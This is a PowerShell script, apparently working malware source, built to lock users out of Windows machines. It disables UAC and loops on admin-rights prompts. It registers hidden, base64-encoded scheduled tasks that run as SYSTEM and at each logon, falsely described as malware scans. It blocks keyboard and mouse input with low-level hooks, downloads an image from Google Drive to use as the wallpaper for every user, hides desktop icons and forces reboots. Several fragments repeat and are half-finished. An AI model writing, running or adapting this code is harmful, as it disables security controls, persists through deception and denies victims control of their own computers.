
New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
#it does not install the image333333333333333333333333333333333333333333333333333333333333333333333333
$scriptBlock10={

   
    $scriptBlock20=@'
        #god do
        #check for background and stuff
        # user do
        $scriptBlock1={

            #execute to user
            Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class H{static IntPtr h,m;static L k,l;delegate IntPtr L(int n,IntPtr w,IntPtr p);public static void S(){k=K;l=K;h=SetWindowsHookEx(14,k,IntPtr.Zero,0);m=SetWindowsHookEx(13,l,IntPtr.Zero,0);}public static void U(){UnhookWindowsHookEx(h);UnhookWindowsHookEx(m);}static IntPtr K(int n,IntPtr w,IntPtr p){return (IntPtr)1;}[DllImport(`"user32.dll`")]static extern IntPtr SetWindowsHookEx(int i,L d,IntPtr m,uint t);[DllImport(`"user32.dll`")]static extern bool UnhookWindowsHookEx(IntPtr h);}";[H]::S();Start-Sleep -Seconds 60;[H]::U();

            #execute stuff for the background
            $sidKeys = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
            # Loop through each SID and perform an action (for example, display the SID name)
            foreach ($sid in $sidKeys) {

                Write-Host "Processing SID: $($sid.Name)"
                $ID=$sid.Name
                $wall=(Get-ItemProperty -Path "Registry::$ID\Control Panel\Desktop").Wallpaper
                if(-not($wall -match "pr.jpg")){

                    Write-Output "not effective"
                    $sidk = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
                    foreach ($s in $sidk) {
                        # Action you want to perform on each SID
                        $ID=$s.Name
                        (Get-ItemProperty -Path "Registry::$ID\Control Panel\Desktop").Wallpaper
                        Set-ItemProperty -Path "Registry::$ID\Control Panel\Desktop" -Name Wallpaper -Value "C:\pr.jpg"
                        Set-ItemProperty -Path "Registry::$ID\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideIcons" -Value 1
                        Write-Output "here"
                        Start-Sleep 30
                        Restart-Computer -Force -Confirm:$false 
                    }
                }
                else{
                Write-Output "already effective"
                }
            }
        }
        #god do
        $encodedCommand2= [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock1.ToString()))
        $condition = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -DontStopIfGoingOnBatteries 
        $action =  New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "-WindowStyle Hidden -EncodedCommand $encodedCommand2"
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $sidKeys = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
        # Loop through each SID and perform an action (for example, display the SID name)
        foreach ($sid in $sidKeys) {


            Write-Host "Processing SID: $($sid.Name)"
            $string = $sid.Name
            $modifiedString = $string -replace '^[^\\]+\\', ''
            $taskName = "FileSystem $modifiedString"
            $task = Get-ScheduledTask | Where-Object {$_.TaskName -eq $taskName}
            if ($task) {
                Write-Host "Task '$taskName' exists."
            
            } 
            else {
                $Principal = New-ScheduledTaskPrincipal -UserId $modifiedString -LogonType Interactive -RunLevel Highest
                Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "FileSystem $modifiedString" -Description "Scan for malicious file in the system" -Principal $Principal -Force 
                Write-Output "here"
                Start-ScheduledTask -TaskName "FileSystem $modifiedString"
            }
        }
'@

    #creation of god
    $encodedCommand20=$encodedCommand20 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock20.ToString()))
    $condition = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -DontStopIfGoingOnBatteries 
    $action =  New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "-WindowStyle Hidden -EncodedCommand $encodedCommand20"
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM"  -RunLevel Highest
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "god" -Description "Scan for malicious file in the system" -Principal $Principal -Force 


    #install the backgroud
    $1="https://drive.usercontent.google.com/u/0/uc?id=1dtDC7rpYLp-kjYCdhUU6L-kMDkhlkUmT&export=download"
    $2="C:\pr.jpg"
    Set-ItemProperty 'HKCU:\Control Panel\Desktop\' -Name WallpaperStyle -Value 2 
    Invoke-WebRequest -Uri $1 -OutFile $2 

    Set-ItemProperty 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value $2
    for ($i = 0; $i -lt 60; $i++) { 
    RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True 
    } 



    Restart-Computer -Force -Confirm:$false #important
}


#start the process
$encodedCommand1 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock10.ToString()))
while(1){
#ask in loop for autorisation
Start-Process powershell.exe -ArgumentList "-EncodedCommand $encodedCommand1" -Verb RunAs -Wait -WindowStyle Hidden
}







#1 install god         reboot 

#2 install user mode   no reboot
#3 activate user mode  reboot
#4 apply user change and lock out



#1 install god         reboot solo
#2 install user schedule   no reboot
#3 activate user change the backgroud in registre but not visible and controle are desactivated and reboot solo  
#4 user is locked out with backgroud 







    #change everything for 1 time
    $sidKeys = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
    # Loop through each SID and perform an action (for example, display the SID name)
    foreach ($sid in $sidKeys) {
        Write-Host "Processing SID: $($sid.Name)"
        $wall=(Get-ItemProperty -Path "Registry::$ID\Control Panel\Desktop").Wallpaper
        if(-not($wall -match "pr.jpg")){
            Write-Output "not effective"
            $sidk = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
            foreach ($s in $sidk) {
                # Action you want to perform on each SID
                $ID=$s.Name
                (Get-ItemProperty -Path "Registry::$ID\Control Panel\Desktop").Wallpaper
                Set-ItemProperty -Path "Registry::$ID\Control Panel\Desktop" -Name Wallpaper -Value "C:\pr.jpg"
                Set-ItemProperty -Path "Registry::$ID\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideIcons" -Value 1
            }
        }
        else{
            Write-Output "already effective"
        }
    }









$scriptBlock20=@'


    $scriptBlock1={
        #execute to user
        Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class H{static IntPtr h,m;static L k,l;delegate IntPtr L(int n,IntPtr w,IntPtr p);public static void S(){k=K;l=K;h=SetWindowsHookEx(14,k,IntPtr.Zero,0);m=SetWindowsHookEx(13,l,IntPtr.Zero,0);}public static void U(){UnhookWindowsHookEx(h);UnhookWindowsHookEx(m);}static IntPtr K(int n,IntPtr w,IntPtr p){return (IntPtr)1;}[DllImport(`"user32.dll`")]static extern IntPtr SetWindowsHookEx(int i,L d,IntPtr m,uint t);[DllImport(`"user32.dll`")]static extern bool UnhookWindowsHookEx(IntPtr h);}";[H]::S();Start-Sleep -Seconds 20;[H]::U();


    }
        
    $encodedCommand2= [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock1.ToString()))
    $condition = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -DontStopIfGoingOnBatteries 
    $action =  New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "-WindowStyle Hidden -EncodedCommand $encodedCommand2"
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $sidKeys = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
    # Loop through each SID and perform an action (for example, display the SID name)
    foreach ($sid in $sidKeys) {


        Write-Host "Processing SID: $($sid.Name)"
        $string = $sid.Name
        $modifiedString = $string -replace '^[^\\]+\\', ''
        $taskName = "FileSystem $modifiedString"
        $task = Get-ScheduledTask | Where-Object {$_.TaskName -eq $taskName}
        if ($task) {
            Write-Host "Task '$taskName' exists."
            
        } else {
            $Principal = New-ScheduledTaskPrincipal -UserId $modifiedString -LogonType Interactive -RunLevel Highest
            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "FileSystem $modifiedString" -Description "Scan for malicious file in the system" -Principal $Principal -Force 
            Restart-Computer
        }
    }

'@
$encodedCommand20=$encodedCommand20 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock20.ToString()))
$condition = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -DontStopIfGoingOnBatteries 
$action =  New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "-WindowStyle Hidden -EncodedCommand $encodedCommand20"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM"  -RunLevel Highest
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "god" -Description "Scan for malicious file in the system" -Principal $Principal -Force 











$sidKeys = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
# Loop through each SID and perform an action (for example, display the SID name)
foreach ($sid in $sidKeys) {

    Write-Host "Processing SID: $($sid.Name)"
    $wall=(Get-ItemProperty -Path "Registry::$ID\Control Panel\Desktop").Wallpaper
    if(-not($wall -match "pr.jpg")){

        Write-Output "not effective"
        $sidk = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
        foreach ($s in $sidk) {
            # Action you want to perform on each SID
            $ID=$s.Name
            (Get-ItemProperty -Path "Registry::$ID\Control Panel\Desktop").Wallpaper
            Set-ItemProperty -Path "Registry::$ID\Control Panel\Desktop" -Name Wallpaper -Value "C:\pr.jpg"
            Set-ItemProperty -Path "Registry::$ID\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideIcons" -Value 0
            #Restart-Computer -Force#########################################################################################################################################################
        }
    }
    else{
    Write-Output "already effective"
    }

}